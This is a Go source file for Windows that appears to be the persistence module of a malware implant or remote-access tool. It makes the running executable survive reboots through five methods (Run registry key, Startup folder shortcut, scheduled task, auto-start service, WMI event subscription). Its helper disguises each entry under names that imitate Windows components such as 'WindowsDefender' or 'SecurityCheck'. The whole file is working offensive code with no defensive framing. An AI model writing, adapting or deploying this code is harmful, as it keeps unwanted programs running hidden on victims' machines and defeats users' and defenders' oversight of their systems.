//go:build windows
// +build windows

package persistence

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var commonNames = []string{
	"SystemUpdate", "SecurityCheck", "WindowsDefender", "MicrosoftEdge",
	"OneDrive", "WindowsBackup", "SystemService", "NetworkManager",
	"AudioService", "GraphicsDriver", "PrintSpooler", "TaskScheduler",
}

func generateObfuscatedName(base string) string {
	if base == "" {
		b := make([]byte, 4)
		rand.Read(b)
		idx := int(b[0]) % len(commonNames)
		return commonNames[idx]
	}
	b := make([]byte, 3)
	rand.Read(b)
	suffix := hex.EncodeToString(b)
	idx := int(b[0]) % len(commonNames)
	return fmt.Sprintf("%s%s", commonNames[idx], suffix)
}

type PersistenceHandler struct {
	execPath string
}

func NewPersistenceHandler() (*PersistenceHandler, error) {
	execPath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return &PersistenceHandler{
		execPath: execPath,
	}, nil
}

func (p *PersistenceHandler) InstallRegistry(name string) error {
	obfName := generateObfuscatedName(name)
	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", obfName,
		"/t", "REG_SZ",
		"/d", p.execPath,
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveRegistry(name string) error {
	cmd := exec.Command("reg", "delete",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) InstallStartupFolder(name string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	linkPath := filepath.Join(startupPath, name+".lnk")

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()",
			linkPath, p.execPath))

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveStartupFolder(name string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	linkPath := filepath.Join(startupPath, name+".lnk")

	return os.Remove(linkPath)
}

func (p *PersistenceHandler) InstallScheduledTask(name string, interval int) error {
	obfName := generateObfuscatedName(name)
	cmd := exec.Command("schtasks", "/create",
		"/tn", obfName,
		"/tr", p.execPath,
		"/sc", "minute",
		"/mo", fmt.Sprintf("%d", interval),
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveScheduledTask(name string) error {
	cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
	return cmd.Run()
}

func (p *PersistenceHandler) InstallService(name, displayName string) error {
	obfName := generateObfuscatedName(name)
	obfDisplay := generateObfuscatedName("") + " Service"
	cmd := exec.Command("sc", "create", obfName,
		"binPath=", p.execPath,
		"DisplayName=", obfDisplay,
		"start=", "auto")

	if err := cmd.Run(); err != nil {
		return err
	}

	startCmd := exec.Command("sc", "start", obfName)
	return startCmd.Run()
}

func (p *PersistenceHandler) RemoveService(name string) error {
	stopCmd := exec.Command("sc", "stop", name)
	stopCmd.Run()

	deleteCmd := exec.Command("sc", "delete", name)
	return deleteCmd.Run()
}

func (p *PersistenceHandler) InstallWMI(name string) error {
	if strings.ContainsAny(name, "'\"\\") {
		return fmt.Errorf("invalid characters in name")
	}
	escapedPath := strings.ReplaceAll(p.execPath, "'", "''")
	escapedPath = strings.ReplaceAll(escapedPath, "\\", "\\\\")

	script := fmt.Sprintf(`
		$filterName = '%s_Filter'
		$consumerName = '%s_Consumer'
		$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
			Name = $filterName
			EventNamespace = 'root\cimv2'
			QueryLanguage = 'WQL'
			Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
		}
		$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
			Name = $consumerName
			CommandLineTemplate = '%s'
		}
		Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
			Filter = $filter
			Consumer = $consumer
		}
	`, name, name, escapedPath)

	cmd := exec.Command("powershell", "-Command", script)
	return cmd.Run()
}

func (p *PersistenceHandler) CheckPersistence(method string) (bool, error) {
	switch method {
	case "registry":
		cmd := exec.Command("reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
		output, err := cmd.Output()
		if err != nil {
			return false, err
		}
		return len(output) > 0, nil
	case "startup":
		startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		entries, err := os.ReadDir(startupPath)
		return len(entries) > 0, err
	default:
		return false, fmt.Errorf("unknown persistence method")
	}
}

func ListPersistenceMethods() []string {
	return []string{"registry", "startup", "scheduled_task", "service", "wmi"}
}
